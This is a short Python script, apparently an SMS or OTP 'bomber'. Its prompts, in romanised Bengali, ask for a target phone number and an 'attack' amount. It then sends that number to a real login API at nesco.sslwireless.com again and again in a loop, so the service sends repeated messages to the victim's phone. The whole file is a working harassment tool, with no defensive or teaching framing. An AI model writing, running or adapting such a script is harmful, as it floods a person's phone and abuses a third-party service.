import requests
from requests.structures import CaseInsensitiveDict
number  = str(input("[>] Rishad Sir apNar aTTack NumBer DiN: "))


amount = int(input("[>] Rishad Sir apNar aTTack ar PoriMaN LikHuN: "))


url1 = "http://nesco.sslwireless.com:80/api/v1/login"

headers1 = CaseInsensitiveDict()
headers1["Content-Type"] = "application/x-www-form-urlencoded"

data1 = "phone_number="+number
for i in range(amount):
    resp = requests.post(url1, headers=headers1, data=data1)
    print(resp.text)